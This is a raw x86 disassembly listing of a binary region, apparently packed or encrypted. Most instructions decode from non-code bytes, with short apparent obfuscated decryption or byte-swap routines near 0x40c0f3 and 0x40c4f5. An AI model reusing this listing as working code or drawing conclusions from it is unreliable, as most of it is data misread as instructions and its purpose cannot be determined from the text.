  40c062:	rcl    BYTE PTR [edx-0x410743d5],cl
  40c068:	fld    DWORD PTR [ebp+eax*8+0x2c1404f9]
  40c06f:	add    eax,0xe1cc234e
  40c074:	fnstcw WORD PTR [eax]
  40c076:	pop    eax
  40c077:	in     al,dx
  40c078:	inc    edi
  40c079:	in     eax,dx
  40c07a:	(bad)  
  40c07b:	lock div DWORD PTR [ecx+0x26]
  40c07f:	dec    eax
  40c080:	scas   eax,DWORD PTR es:[edi]
  40c081:	das    
  40c082:	lahf   
  40c083:	xchg   ebx,eax
  40c084:	(bad)  
  40c085:	mov    ebx,0x4d0ddd5a
  40c08a:	dec    edi
  40c08b:	int3   
  40c08c:	ret    0x7c3
  40c08f:	out    0x26,eax
  40c091:	lods   eax,DWORD PTR ds:[esi]
  40c092:	cmc    
  40c093:	adc    eax,0xacf503cd
  40c098:	(bad)  
  40c099:	out    0x7c,eax
  40c09b:	push   es
  40c09c:	arpl   sp,dx
  40c09e:	mov    bh,ch
  40c0a0:	fcom   DWORD PTR [edx]
  40c0a2:	(bad)  
  40c0a3:	cli    
  40c0a4:	mov    cl,0x31
  40c0a6:	sbb    ah,BYTE PTR [ebx]
  40c0a8:	mov    bh,0x25
  40c0aa:	cmp    ah,BYTE PTR [edi+edi*2-0x69]
  40c0ae:	gs jnp 0x40c060
  40c0b1:	pop    es
  40c0b2:	mov    ebx,0xad24dd65
  40c0b7:	inc    ecx
  40c0b8:	push   ss
  40c0b9:	inc    edi
  40c0ba:	push   0xffffffa6
  40c0bc:	je     0x40c111
  40c0be:	and    DWORD PTR [ebp-0x2b],0x25
  40c0c2:	out    0x26,al
  40c0c4:	push   ebx
  40c0c5:	shl    ecx,1
  40c0c7:	sbb    al,0xc6
  40c0c9:	imul   edx,DWORD PTR [ecx],0xffffffe1
  40c0cc:	fsubrp st(6),st
  40c0ce:	sub    BYTE PTR [eax-0x77],ch
  40c0d1:	pop    edx
  40c0d2:	and    al,0xa8
  40c0d4:	pop    ebx
  40c0d5:	das    
  40c0d6:	push   ds
  40c0d7:	jae    0x40c0db
  40c0d9:	push   ds
  40c0da:	sbb    BYTE PTR [esi-0x15],al
  40c0dd:	inc    ebp
  40c0de:	je     0x40c0ca
  40c0e0:	clc    
  40c0e1:	and    DWORD PTR [edi+edx*1+0x9],0xffffffc9
  40c0e6:	hlt    
  40c0e7:	dec    edx
  40c0e8:	adc    al,0xe4
  40c0ea:	jns    0x40c077
  40c0ec:	push   ebp
  40c0ed:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    cx,WORD PTR ds:[ebx+0x2e17fb75]
  40c148:	mov    esi,DWORD PTR [eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c139
  40c150:	out    dx,al
  40c151:	fdivr  DWORD PTR [ebp+0xfdcd515]
  40c157:	js     0x40c0e9
  40c159:	fidivr DWORD PTR [eax-0x3b0b3d73]
  40c15f:	jne    0x40c187
  40c161:	sbb    cl,BYTE PTR [ecx-0x54]
  40c164:	mov    edi,DWORD PTR [edx]
  40c166:	dec    edx
  40c167:	fnstsw WORD PTR [edx-0x420eaa22]
  40c16d:	xchg   esp,eax
  40c16e:	dec    ecx
  40c16f:	mov    WORD PTR [eax],cs
  40c171:	xchg   ecx,eax
  40c172:	pop    esi
  40c173:	jecxz  0x40c10f
  40c175:	mov    ebx,0x75f26031
  40c17a:	jmp    0x868b:0x38e31c60
  40c181:	sub    BYTE PTR [eax-0x2f57b789],al
  40c187:	add    ah,BYTE PTR [edx-0x7e1818a2]
  40c18d:	mov    ecx,0x4358ec72
  40c192:	call   0x818e:0x9df22987
  40c199:	rcl    dl,cl
  40c19b:	lods   eax,DWORD PTR fs:[esi]
  40c19d:	xchg   edx,eax
  40c19e:	or     eax,0xb20c9326
  40c1a3:	shl    DWORD PTR [ebp+0x4f452c7a],cl
  40c1a9:	and    ch,0x85
  40c1ac:	mov    ds:0x3530bee,al
  40c1b1:	push   eax
  40c1b2:	sti    
  40c1b3:	mov    DWORD PTR [edi],esp
  40c1b5:	pop    esi
  40c1b6:	push   ss
  40c1b7:	out    0x19,eax
  40c1b9:	imul   esi,DWORD PTR [esi+edi*2],0xffffffb3
  40c1bd:	dec    ebp
  40c1be:	lods   al,BYTE PTR ds:[esi]
  40c1bf:	imul   DWORD PTR [edx+ebx*1-0x257b0eb6]
  40c1c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1c7:	loop   0x40c240
  40c1c9:	pop    ebp
  40c1ca:	pop    ebp
  40c1cb:	add    BYTE PTR [edx-0x6288f29],cl
  40c1d1:	jns    0x40c191
  40c1d3:	or     dl,BYTE PTR [ecx-0x40]
  40c1d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1d7:	xchg   ebx,eax
  40c1d8:	add    cl,BYTE PTR [edx-0xbc0a005]
  40c1de:	fldenv [ebx+0x3268d658]
  40c1e4:	leave  
  40c1e5:	dec    esp
  40c1e6:	in     al,dx
  40c1e7:	sbb    BYTE PTR [edx+esi*4],dl
  40c1ea:	test   DWORD PTR [eax-0x4d87eea8],esp
  40c1f0:	xchg   edi,eax
  40c1f1:	mov    ah,0x75
  40c1f3:	out    dx,eax
  40c1f4:	adc    eax,0x48919002
  40c1f9:	stos   BYTE PTR es:[edi],al
  40c1fa:	add    dh,BYTE PTR [ebx+0x5cf37af9]
  40c200:	or     eax,0x86e1818
  40c205:	icebp  
  40c206:	adc    dh,bl
  40c208:	sub    dh,al
  40c20a:	outs   dx,DWORD PTR ds:[esi]
  40c20b:	dec    ebp
  40c20c:	(bad)  
  40c20d:	cmp    eax,0x72d809
  40c212:	dec    eax
  40c213:	(bad)  
  40c214:	push   ds
  40c215:	mov    cl,0x33
  40c217:	jg     0x40c225
  40c219:	inc    BYTE PTR [edx]
  40c21b:	jnp    0x40c1fa
  40c21d:	dec    ecx
  40c21e:	pop    eax
  40c21f:	fldcw  WORD PTR [esi]
  40c221:	das    
  40c222:	shr    DWORD PTR [ebx+0x368b8bed],0xbd
  40c229:	and    al,0xd6
  40c22b:	ins    BYTE PTR es:[edi],dx
  40c22c:	iret   
  40c22d:	pop    esi
  40c22e:	push   esi
  40c22f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c230:	call   0x1321b954
  40c235:	aad    0x7
  40c237:	scas   eax,DWORD PTR es:[edi]
  40c238:	adc    eax,0x5e001051
  40c23d:	add    esi,DWORD PTR [esi-0x664722d2]
  40c243:	rol    DWORD PTR [edi+0x51],0xa3
  40c247:	dec    eax
  40c248:	stc    
  40c249:	in     al,0x6b
  40c24b:	pop    eax
  40c24c:	xor    BYTE PTR [edi+eax*2],ah
  40c24f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c250:	adc    DWORD PTR [esi+0x25],esi
  40c253:	dec    DWORD PTR [eax+0x67]
  40c256:	add    eax,0x45815827
  40c25b:	rcr    BYTE PTR [edi],cl
  40c25d:	mov    edx,0x1b958854
  40c262:	dec    ecx
  40c263:	out    dx,al
  40c264:	call   0x48e4:0x74609796
  40c26b:	mov    edx,0x1bdc52bd
  40c270:	sbb    esi,esp
  40c272:	mov    edx,0x386472ab
  40c277:	stc    
  40c278:	adc    BYTE PTR [eax+0x44f3b332],0xa5
  40c27f:	mov    esi,0x65306897
  40c284:	cmp    edx,DWORD PTR [ebx-0x45]
  40c287:	push   eax
  40c288:	push   ebx
  40c289:	add    DWORD PTR [edi],esi
  40c28b:	or     al,0x1b
  40c28d:	or     al,0xc
  40c28f:	push   edx
  40c290:	ins    DWORD PTR es:[edi],dx
  40c291:	outs   dx,DWORD PTR ds:[esi]
  40c292:	je     0x40c237
  40c294:	jo     0x40c2c7
  40c296:	xor    DWORD PTR [ebx+0x668fb821],edi
  40c29c:	mov    bh,BYTE PTR [eax-0x6]
  40c29f:	sbb    BYTE PTR [eax+0x54f29388],al
  40c2a5:	pop    ebx
  40c2a6:	and    bl,BYTE PTR [esi]
  40c2a8:	iret   
  40c2a9:	jnp    0x40c26d
  40c2ab:	cmp    ecx,ecx
  40c2ad:	scas   eax,DWORD PTR es:[edi]
  40c2ae:	inc    esi
  40c2af:	jno    0x40c2a9
  40c2b1:	xor    eax,DWORD PTR [edi-0x3af33278]
  40c2b7:	cwde   
  40c2b8:	(bad)  
  40c2b9:	(bad)  
  40c2ba:	xchg   edi,eax
  40c2bb:	jnp    0x40c2d7
  40c2bd:	mov    ah,bl
  40c2bf:	les    ecx,FWORD PTR [edi]
  40c2c1:	and    BYTE PTR [ebx+0x715f4163],ch
  40c2c7:	(bad)  
  40c2c9:	ja     0x40c326
  40c2cb:	bnd jae 0x40c262
  40c2ce:	pop    ebp
  40c2cf:	fld    TBYTE PTR [eax]
  40c2d1:	xor    bh,0xa1
  40c2d4:	out    dx,eax
  40c2d5:	jmp    0x40c33f
  40c2d7:	movups xmm5,xmm7
  40c2da:	loope  0x40c27b
  40c2dc:	cmp    dl,BYTE PTR [esi-0x3]
  40c2df:	fldenv [edx+0x7a]
  40c2e2:	(bad)  
  40c2e3:	shl    DWORD PTR [ebp+0x32],0xfc
  40c2e7:	ret    0x1a86
  40c2ea:	dec    eax
  40c2eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ec:	jg     0x40c2f3
  40c2ee:	fcom   DWORD PTR [edi+0x741dce30]
  40c2f4:	mov    bl,0xb
  40c2f6:	nop
  40c2f7:	pushf  
  40c2f8:	iret   
  40c2f9:	repnz sbb eax,0xe17dfb78
  40c2ff:	mov    edi,DWORD PTR [edi]
  40c301:	in     eax,dx
  40c302:	rcr    DWORD PTR [edi-0x11],1
  40c305:	fdiv   DWORD PTR [ebp-0x5f82b76b]
  40c30b:	lods   al,BYTE PTR ds:[esi]
  40c30c:	(bad)  
  40c30d:	jae    0x40c2ce
  40c30f:	lock xor DWORD PTR [ebp-0x38],0x20
  40c314:	and    eax,0x6d802c22
  40c319:	std    
  40c31a:	fldenv [esi+eiz*1-0x42]
  40c31e:	add    al,0xf4
  40c320:	(bad)  
  40c321:	fstp   TBYTE PTR [edx]
  40c323:	dec    edx
  40c324:	js     0x40c37a
  40c326:	les    esi,FWORD PTR [edx+edi*4-0x1c]
  40c32a:	pop    es
  40c32b:	ret    
  40c32c:	mov    cl,BYTE PTR [ebx+0x72d4dc90]
  40c332:	mov    ebp,0xf6c13a51
  40c337:	cs sub eax,0xb561b2a4
  40c33d:	xlat   BYTE PTR ds:[ebx]
  40c33e:	(bad)  
  40c33f:	scas   al,BYTE PTR es:[edi]
  40c340:	cmp    BYTE PTR [ecx],dl
  40c342:	lods   eax,DWORD PTR ds:[esi]
  40c343:	or     DWORD PTR gs:0x80150245,edx
  40c34a:	in     eax,dx
  40c34b:	lods   al,BYTE PTR ds:[esi]
  40c34c:	pop    ds
  40c34d:	adc    al,0x5e
  40c34f:	fwait
  40c350:	lock cmp BYTE PTR [ebx-0x5e],0xbc
  40c355:	and    BYTE PTR [ecx+0x17],ch
  40c358:	clc    
  40c359:	sub    al,0x33
  40c35b:	lods   eax,DWORD PTR ds:[esi]
  40c35c:	aad    0x6c
  40c35e:	scas   eax,DWORD PTR es:[edi]
  40c35f:	push   edi
  40c360:	ss push ebx
  40c362:	dec    esi
  40c363:	rol    esi,0x9e
  40c366:	out    dx,al
  40c367:	and    BYTE PTR [esi],dh
  40c369:	sub    esp,esi
  40c36b:	imul   eax,DWORD PTR [edi+eiz*1+0x307096d8],0xffffff8c
  40c373:	jae    0x40c3e0
  40c375:	stos   BYTE PTR es:[edi],al
  40c376:	jge    0x40c3e5
  40c378:	ja     0x40c30e
  40c37a:	stos   DWORD PTR es:[edi],eax
  40c37b:	ins    DWORD PTR es:[edi],dx
  40c37c:	imul   ebp,DWORD PTR [esi],0x48368636
  40c382:	or     ch,BYTE PTR [esi-0x46]
  40c385:	aam    0x19
  40c387:	lea    ecx,[ebp-0x692adef8]
  40c38d:	jo     0x40c329
  40c38f:	sbb    bl,BYTE PTR [eax]
  40c391:	mov    gs,WORD PTR [ecx-0x64905356]
  40c397:	fs pop eax
  40c399:	push   edx
  40c39a:	add    dh,BYTE PTR cs:0x31539d61
  40c3a1:	sbb    DWORD PTR [edi-0x7d],0xffffff89
  40c3a5:	or     al,0xcd
  40c3a7:	std    
  40c3a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3a9:	ds mov esi,0xec0ddfde
  40c3af:	mov    esp,0xa2ecc3fc
  40c3b4:	popf   
  40c3b5:	inc    esp
  40c3b6:	shl    DWORD PTR [ebp-0x2a],0x7b
  40c3ba:	xor    al,dl
  40c3bc:	or     al,0xa0
  40c3be:	xlat   BYTE PTR ds:[ebx]
  40c3bf:	sbb    edx,esi
  40c3c1:	inc    ebx
  40c3c2:	inc    esi
  40c3c3:	xchg   ecx,eax
  40c3c4:	rol    DWORD PTR [edx],1
  40c3c6:	aad    0xa6
  40c3c8:	rcr    BYTE PTR [ecx+0x3e],1
  40c3cb:	push   0x196d68d0
  40c3d0:	call   0xbfbf9df9
  40c3d5:	fild   QWORD PTR [eax-0x5604c707]
  40c3db:	pop    edx
  40c3dc:	pop    ebp
  40c3dd:	stc    
  40c3de:	inc    edx
  40c3df:	jno    0x40c392
  40c3e1:	out    0x97,eax
  40c3e3:	add    eax,DWORD PTR [edx]
  40c3e5:	daa    
  40c3e6:	test   al,0x82
  40c3e8:	push   ds
  40c3e9:	rcl    DWORD PTR [ebx-0xfa1f2e9],0x90
  40c3f0:	xor    ah,BYTE PTR [edi]
  40c3f2:	dec    edx
  40c3f3:	dec    ecx
  40c3f4:	dec    esp
  40c3f5:	pusha  
  40c3f6:	es jp  0x40c443
  40c3f9:	xchg   DWORD PTR es:[ebx-0xa],edx
  40c3fd:	and    eax,0x792fbf2c
  40c402:	imul   esp,DWORD PTR [eax-0x7bc804c],0x4c7e46fd
  40c40c:	cmp    BYTE PTR [ecx+0x7b610c2],al
  40c412:	fistp  DWORD PTR ds:0x1fc8aba
  40c418:	dec    eax
  40c419:	mov    ds,WORD PTR [ebx]
  40c41b:	push   ecx
  40c41c:	fild   QWORD PTR [ecx-0x12]
  40c41f:	call   0x795f9847
  40c424:	scas   al,BYTE PTR es:[edi]
  40c425:	lahf   
  40c426:	adc    al,0xee
  40c428:	iret   
  40c429:	ss (bad) 
  40c42b:	in     eax,0xf
  40c42d:	pusha  
  40c42e:	adc    cl,al
  40c430:	and    DWORD PTR [esi-0x25224ec8],edx
  40c436:	sub    eax,edi
  40c438:	fcos   
  40c43a:	mov    ds:0x7c7c5dc2,eax
  40c43f:	adc    eax,DWORD PTR [edx-0x3a]
  40c442:	pop    ds
  40c443:	cmp    DWORD PTR [edi-0x52],edx
  40c446:	jge    0x40c434
  40c448:	mov    ah,0xee
  40c44a:	sbb    esp,0xfffffffc
  40c44d:	jne    0x40c43e
  40c44f:	lds    esp,FWORD PTR [edi]
  40c451:	(bad)  
  40c453:	mov    ebx,esi
  40c455:	push   ebx
  40c456:	push   esp
  40c457:	cmp    bl,BYTE PTR [edi-0x2bc35c7b]
  40c45d:	xchg   ecx,eax
  40c45e:	or     bl,bh
  40c460:	xchg   edx,eax
  40c461:	or     al,BYTE PTR [eax+0x43]
  40c464:	xor    esi,DWORD PTR [edi-0x2]
  40c467:	outs   dx,BYTE PTR ds:[esi]
  40c468:	dec    esi
  40c469:	sbb    al,0xb6
  40c46b:	ins    BYTE PTR es:[edi],dx
  40c46c:	mov    edx,?
  40c46e:	jne    0x40c4a3
  40c470:	leave  
  40c471:	jge    0x40c3f5
  40c473:	out    dx,al
  40c474:	mov    WORD PTR [ecx+0x27c9eec1],gs
  40c47a:	xor    dh,bh
  40c47c:	sub    DWORD PTR ds:0x9362387a,esp
  40c482:	out    dx,al
  40c483:	mov    ecx,0xe11497c2
  40c488:	mov    edx,0x499e9760
  40c48d:	pushf  
  40c48e:	repz jns 0x40c47c
  40c491:	mov    al,0x3f
  40c493:	ret    0x554d
  40c496:	xor    cl,BYTE PTR [esi-0x16]
  40c499:	xor    DWORD PTR [eax],esi
  40c49b:	push   ss
  40c49c:	jle    0x40c4a6
  40c49e:	mov    dl,0x17
  40c4a0:	clc    
  40c4a1:	cmp    bh,bh
  40c4a3:	pop    es
  40c4a4:	and    BYTE PTR [ebx-0x20],bl
  40c4a7:	sbb    al,0x4d
  40c4a9:	jl     0x40c4f6
  40c4ab:	in     eax,dx
  40c4ac:	jmp    0x88d3:0x8446154d
  40c4b3:	mov    bh,0xd5
  40c4b5:	sub    DWORD PTR [ebp+0x44],edi
  40c4b8:	sahf   
  40c4b9:	stos   DWORD PTR es:[edi],eax
  40c4ba:	push   ss
  40c4bb:	mov    esi,0xf9fdaca0
  40c4c0:	adc    eax,0xb064e0fa
  40c4c5:	adc    BYTE PTR [edx-0x1b],al
  40c4c8:	ficom  WORD PTR [ecx+0x7f]
  40c4cb:	add    edi,esp
  40c4cd:	in     al,0xa0
  40c4cf:	xchg   edx,eax
  40c4d0:	cdq    
  40c4d1:	push   cs
  40c4d2:	rol    BYTE PTR [esi],1
  40c4d4:	gs lock pop eax
  40c4d7:	jne    0x40c50a
  40c4d9:	or     edi,DWORD PTR [ecx+edi*1]
  40c4dc:	outs   dx,DWORD PTR ds:[esi]
  40c4dd:	pop    es
  40c4de:	mov    ds:0x4407a3f8,eax
  40c4e3:	pop    ss
  40c4e4:	jo     0x40c4aa
  40c4e6:	js     0x40c551
  40c4e8:	ror    bh,0x53
  40c4eb:	xor    BYTE PTR [edx+esi*8-0x2fccb7ad],0x3
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	sub    esp,DWORD PTR [esi-0x80]
  40c543:	cmp    eax,0x7070884d
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c56b
  40c54d:	inc    edi
  40c54e:	cmp    al,0x3d
  40c550:	daa    
  40c551:	mov    esi,0x219147d5
  40c556:	mov    al,0xdd
  40c558:	ds mov esi,0xbda0b59c
  40c55e:	mov    ebx,0x8dec16ad
  40c563:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c564:	repnz pushf 
  40c566:	xchg   ebx,eax
  40c567:	int    0xd0
  40c569:	sbb    dh,BYTE PTR ds:0x1b7164da
  40c56f:	loopne 0x40c5cf
  40c571:	test   eax,0xf87c3440
  40c576:	xchg   edx,eax
  40c577:	adc    DWORD PTR [esp+eax*8+0x1c98d16b],eax
  40c57e:	mov    BYTE PTR [ebp+0x44c94e55],dh
  40c584:	jmp    0xa48d:0x949bde2b
  40c58b:	jmp    0x40c5e0
  40c58d:	arpl   WORD PTR [eax+0x2],cx
  40c590:	es int 0x8b
  40c593:	cmp    BYTE PTR [edx],0x13
  40c596:	pusha  
  40c597:	cdq    
  40c598:	pop    eax
  40c599:	adc    DWORD PTR [edi+0x3f0cef0b],ebx
  40c59f:	out    dx,eax
  40c5a0:	popa   
  40c5a1:	(bad)  
  40c5a2:	ror    DWORD PTR [ebx+eiz*8+0x75cd26e],1
  40c5a9:	stos   DWORD PTR es:[edi],eax
  40c5aa:	imul   eax,DWORD PTR [esi+0x73],0xfaced40c
  40c5b1:	in     al,0xf5
  40c5b3:	inc    ebp
  40c5b4:	mov    ch,0xbb
  40c5b6:	push   0x72
  40c5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5b9:	lods   al,BYTE PTR ds:[esi]
  40c5ba:	sub    eax,0xf4ed63a2
  40c5bf:	dec    edx
  40c5c0:	dec    ecx
  40c5c1:	adc    ah,BYTE PTR [ebp+0x2683395d]
  40c5c7:	imul   edx,DWORD PTR [ecx-0x30be9e3c],0x8f0f19ec
  40c5d1:	fdiv   DWORD PTR [ecx+0x23]
  40c5d4:	adc    al,0x54
  40c5d6:	enter  0x4b6,0xdf
  40c5da:	div    BYTE PTR [edi+0x78e6e3cb]
  40c5e0:	test   BYTE PTR [ecx],0xd6
  40c5e3:	jo     0x40c5b0
  40c5e5:	pop    ss
  40c5e6:	xor    edi,0xb
  40c5e9:	or     DWORD PTR ds:0x148bcc3d,ecx
  40c5ef:	sbb    cl,BYTE PTR [bp+di]
  40c5f2:	dec    esi
  40c5f3:	sbb    ebp,DWORD PTR [eax+0x5a]
  40c5f6:	mov    bl,0x8f
  40c5f8:	or     edx,DWORD PTR [edx-0x6c7261ae]
  40c5fe:	pop    esi
  40c5ff:	xchg   ebp,edi
  40c601:	mov    al,ds:0x395e345e
  40c606:	ja     0x40c634
  40c608:	sub    BYTE PTR [ebx],0xdc
  40c60b:	push   ebx
  40c60c:	inc    eax
  40c60d:	ret    0x9c38
  40c610:	mov    WORD PTR [edx+0x60],ds
  40c613:	pop    esi
  40c614:	leave  
  40c615:	popa   
  40c616:	sahf   
  40c617:	scas   al,BYTE PTR es:[edi]
  40c618:	out    dx,al
  40c619:	sbb    bh,BYTE PTR [edi+0x3c70d2d8]
  40c61f:	in     eax,dx
  40c620:	in     al,0x98
  40c622:	adc    eax,0x55527173
  40c627:	dec    edi
  40c628:	and    eax,esp
  40c62a:	(bad)  
  40c62c:	fcom   DWORD PTR [edi+ecx*2+0x4d]
  40c630:	jbe    0x40c60f
  40c632:	xchg   DWORD PTR [ecx+0x52],edx
  40c635:	out    0x6e,eax
  40c637:	adc    BYTE PTR [ecx+ebx*2],0xc2
  40c63b:	fs ja  0x40c667
  40c63e:	mov    eax,ds:0x5b72e02e
  40c643:	imul   edx,ecx,0xac280504
  40c649:	sub    bl,BYTE PTR [edx+0x33]
  40c64c:	jo     0x40c63d
  40c64e:	or     ch,0x89
  40c651:	add    al,0x9b
  40c653:	dec    ebx
  40c654:	pusha  
  40c655:	and    esp,DWORD PTR [ecx+0x6bceecf5]
  40c65b:	popa   
  40c65c:	push   DWORD PTR [ebx+0x34bd7634]
  40c662:	lods   eax,DWORD PTR ds:[esi]
  40c663:	sub    bl,BYTE PTR [ecx+0x63]
  40c666:	jmp    0x94fdab12
  40c66b:	push   0xffffffeb
  40c66d:	popf   
  40c66e:	lahf   
  40c66f:	ret    
  40c670:	sub    dh,BYTE PTR [edi-0x29]
  40c673:	and    eax,DWORD PTR [ecx-0x3c422a84]
  40c679:	mul    DWORD PTR [esi-0x64d02443]
  40c67f:	or     eax,0xaa3d28af
  40c684:	push   0xffffff94
  40c686:	cmc    
  40c687:	add    eax,0x30a90877
  40c68c:	in     al,dx
  40c68d:	xchg   edx,eax
  40c68e:	xlat   BYTE PTR ds:[ebx]
  40c68f:	inc    esp
  40c690:	(bad)  ds:0x3a40f27
  40c696:	pop    ebx
  40c697:	sub    ebp,ebx
  40c699:	out    dx,al
  40c69a:	dec    ecx
  40c69c:	adc    edi,ebp
  40c69e:	pop    es
  40c69f:	jge    0x40c6b3
  40c6a1:	mov    edi,0x9703dba9
  40c6a6:	mov    eax,0x7c046bc6
  40c6ab:	adc    dh,BYTE PTR [ebx+0x712a0019]
  40c6b1:	in     eax,0xd7
  40c6b3:	mov    ecx,DWORD PTR [ebx]
  40c6b5:	add    eax,0xf19a8ff8
  40c6ba:	dec    edx
  40c6bb:	sar    BYTE PTR [esi-0x3c],cl
  40c6be:	push   eax
  40c6bf:	ins    DWORD PTR es:[edi],dx
  40c6c0:	mov    ah,cl
  40c6c2:	xor    edx,DWORD PTR [edx]
  40c6c4:	xchg   edx,eax
  40c6c5:	mov    esp,0x1d31e433
  40c6ca:	mov    fs,WORD PTR [ebp-0x5d]
  40c6cd:	sub    eax,0xe93523b4
  40c6d2:	ss jg  0x40c669
  40c6d5:	cli    
  40c6d6:	das    
  40c6d7:	inc    esp
  40c6d8:	inc    ebp
  40c6d9:	cli    
  40c6da:	in     eax,dx
  40c6db:	mov    esp,0x474726fe
  40c6e0:	jo     0x40c6b2
  40c6e2:	jne    0x40c6c8
  40c6e4:	(bad)  
  40c6e5:	pop    ss
  40c6e6:	test   al,0x6
  40c6e8:	je     0x40c678
  40c6ea:	call   0x691d:0xfe982cef
  40c6f1:	in     eax,dx
  40c6f2:	repz jecxz 0x40c773
  40c6f5:	mov    dl,0x2c
  40c6f7:	jne    0x40c6c6
  40c6f9:	sbb    ebx,DWORD PTR [edi+0x64]
  40c6fc:	(bad)  
  40c6fd:	and    eax,0x4647bf8d
  40c702:	pop    edx
  40c703:	cli    
  40c704:	sbb    eax,0x56a361b3
  40c709:	rcl    DWORD PTR [ecx+0x3854d5eb],cl
  40c70f:	leave  
  40c710:	jl     0x40c6a2
  40c712:	mov    ds:0xfadbefa9,al
  40c717:	add    esp,ebx
  40c719:	into   
  40c71a:	and    BYTE PTR [edx+0x5f24cabd],bh
  40c720:	push   0x12
  40c722:	and    al,0xf1
  40c724:	cmp    DWORD PTR [ebp-0x39b0e5ca],0xfffffffe
  40c72b:	neg    BYTE PTR [eax+0x6fa0a5b0]
  40c731:	adc    ebp,edx
  40c733:	cmp    al,0x0
  40c735:	and    edx,DWORD PTR [ecx+0x27962161]
  40c73b:	or     edi,DWORD PTR [ecx-0x14]
  40c73e:	sbb    BYTE PTR [edx-0x58ad4f18],dh
  40c744:	inc    edx
  40c745:	shl    BYTE PTR [esp+edi*8],cl
  40c748:	fcom   QWORD PTR [ecx+0x21]
  40c74b:	mov    ecx,0x70ce4bbb
  40c750:	inc    esp
  40c751:	nop
  40c752:	nop
  40c753:	fild   WORD PTR [ecx]
  40c755:	in     eax,0xcc
  40c757:	int3   
  40c758:	fld    TBYTE PTR [edi-0x1879fc46]
  40c75e:	adc    eax,0xfbd0f1e0
  40c763:	jle    0x40c6e7
  40c765:	cld    
  40c766:	out    dx,al
  40c767:	cli    
  40c768:	bound  ecx,QWORD PTR [edi-0x7f]
  40c76b:	ins    DWORD PTR es:[edi],dx
  40c76c:	jno    0x40c700
  40c76e:	test   al,0x1d
  40c770:	aad    0xe8
  40c772:	bound  eax,QWORD PTR [eax+0x7ca8779a]
  40c778:	shr    BYTE PTR [ecx],1
  40c77a:	jns    0x40c7a4
  40c77c:	pop    ebx
  40c77d:	jecxz  0x40c78e
  40c77f:	out    dx,al
  40c780:	push   DWORD PTR [eax-0x1ced3505]
  40c786:	dec    ebp
  40c787:	xchg   ecx,eax
  40c788:	pop    ds
  40c789:	cs push ss
  40c78b:	es scas ax,WORD PTR es:[edi]
  40c78e:	mov    esp,0xcc168014
  40c793:	sub    esi,DWORD PTR [eax+ecx*1+0x18bd5c92]
  40c79a:	dec    edi
  40c79b:	mov    dh,0xd6
  40c79d:	mov    edi,0xcf6392ae
  40c7a2:	adc    ecx,DWORD PTR [esi+eiz*8+0x5e]
  40c7a6:	data16 mov ch,ch
  40c7a9:	and    ebx,DWORD PTR [ebp+0x77]
  40c7ac:	cmp    BYTE PTR [esi+0x3],ch
  40c7af:	adc    ebx,ebx
  40c7b1:	aas    
  40c7b2:	mov    cl,0xf2
  40c7b4:	sahf   
  40c7b5:	dec    esp
  40c7b6:	enter  0xe878,0xdd
  40c7ba:	es pop ebp
  40c7bc:	jmp    0x91290d4b
  40c7c1:	pop    esp
  40c7c2:	pop    ecx
  40c7c3:	fistp  WORD PTR ds:0x8231dbd3
  40c7c9:	jnp    0x40c7d3
  40c7cb:	adc    eax,0x22d956b8
  40c7d0:	cs or  eax,0x330a21ce
  40c7d6:	sub    dl,0x35
  40c7d9:	(bad)  
  40c7db:	adc    esi,DWORD PTR [esi+0x772eb1ef]
  40c7e1:	iret   
  40c7e2:	stos   DWORD PTR es:[edi],eax
  40c7e3:	mov    ch,0xb2
  40c7e5:	je     0x40c7e4
